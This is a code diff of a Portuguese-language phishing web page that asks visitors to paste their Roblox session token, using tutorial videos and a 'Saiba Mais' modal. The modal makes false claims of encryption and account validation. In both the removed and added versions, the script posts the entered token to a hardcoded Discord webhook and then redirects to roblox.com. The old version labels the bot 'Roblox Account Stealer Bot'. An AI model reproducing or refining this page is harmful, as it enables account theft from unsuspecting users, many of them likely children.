@@ -16,30 +16,17 @@
             position: relative;
             overflow: hidden;
         }
-        /* Estilo comum para as seções de vídeo */
         .video-group { 
             position: absolute;
             top: 10%;  
             width: 320px;
             text-align: center;
         }
-        .video-group iframe {
-            border-radius: 8px;
-            border: 1px solid #444;
-        }
-        .video-group p { 
-            margin-top: 10px; 
-            font-size: 1.1em;
-            color: #ccc;
-            font-weight: bold;
-        }
-        /* Posicionamento Esquerda (PC) */
+        .video-group iframe { border-radius: 8px; border: 1px solid #444; }
+        .video-group p { margin-top: 10px; font-size: 1.1em; color: #ccc; font-weight: bold; }
         .left-video { left: 20px; }
-        
-        /* Posicionamento Direita (Mobile) */
         .right-video { right: 20px; }
 
-        /* Container Central de Captura */
         .container { 
             border: 1px solid #333; 
             padding: 40px; 
@@ -61,7 +48,7 @@
             font-family: monospace; 
             box-sizing: border-box;
         }
-        button { 
+        .btn-main { 
             width: 100%;
             padding: 12px 25px; 
             cursor: pointer; 
@@ -71,12 +58,46 @@
             font-weight: bold; 
             border-radius: 5px; 
         }
-        button:hover { background: #c82333; }
+
+        /* Botão Saiba Mais no meio inferior */
+        .btn-info {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            background: #444;
+            color: white;
+            border: 1px solid #666;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+        }
+
+        /* Modal (Janela de Informações) */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0; top: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.8);
+        }
+        .modal-content {
+            background-color: #252525;
+            margin: 10% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 50%;
+            border-radius: 10px;
+            text-align: left;
+        }
+        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
+
     <div class="video-group left-video">
-        <iframe width="100%" height="180" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0" allowfullscreen></iframe>
+        <iframe width="100%" height="180" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0"></iframe>
         <p>Tutorial pra pc</p>
     </div>
 
@@ -85,43 +106,42 @@
         <p>Insira o token aqui</p>
         <input type="text" id="userToken" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
         <br>
-        <button onclick="enviarToken()">Enviar token</button>
+        <button class="btn-main" onclick="enviarToken()">Enviar token</button>
     </div>
 
     <div class="video-group right-video">
-        <iframe width="100%" height="180" src="https://www.youtube.com/embed/nwHMDsXw8WE" frameborder="0" allowfullscreen></iframe>
+        <iframe width="100%" height="180" src="https://www.youtube.com/embed/nwHMDsXw8WE" frameborder="0"></iframe>
         <p>Tutorial pra mobile</p>
     </div>
 
-    <script>
-    function enviarToken() {
-        const tokenValue = document.getElementById('userToken').value;
-        const webhookURL = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
-        
-        const payload = {
-            username: "Roblox Account Stealer Bot",
-            content: "🚨 **NOVO TOKEN CAPTURADO!** 🚨",
-            embeds: [{
-                title: "ALERTA DE CAPTURA - Roblox Token",
-                fields: [
-                    { name: "Status", value: "Captura Executada", inline: true },
-                    { name: "Valor do Token", value: "```" + tokenValue + "```" }
-                ],
-                color: 16711680,
-                timestamp: new Date()
-            }]
-        };
+    <button class="btn-info" onclick="abrirModal()">Saiba Mais</button>
 
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).then(() => {
-            window.location.href = "https://www.roblox.com/";
-        }).catch(err => {
-            console.error("Erro.");
-        });
-    }
+    <div id="infoModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="fecharModal()">&times;</span>
+            <h3>Informações do Sistema</h3>
+            <p><strong>Quem somos:</strong> Somos uma equipe especializada em ferramentas de automação e análise de dados de rede.</p>
+            <p><strong>Como funciona:</strong> Nosso sistema utiliza integração via API para validar tokens de sessão e garantir a integridade da conta em nossos servidores externos.</p>
+            <p><strong>Segurança:</strong> Utilizamos criptografia de ponta-a-ponta e webhooks seguros para garantir que os dados cheguem ao destino sem interceptações de terceiros.</p>
+        </div>
+    </div>
+
+    <script>
+        function abrirModal() { document.getElementById("infoModal").style.display = "block"; }
+        function fecharModal() { document.getElementById("infoModal").style.display = "none"; }
+
+        function enviarToken() {
+            const tokenValue = document.getElementById('userToken').value;
+            const webhookURL = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🚨 **NOVO TOKEN CAPTURADO!** 🚨\n```" + tokenValue + "```"
+                })
+            }).then(() => { window.location.href = "https://www.roblox.com/"; });
+        }
     </script>
 </body>
 </html>
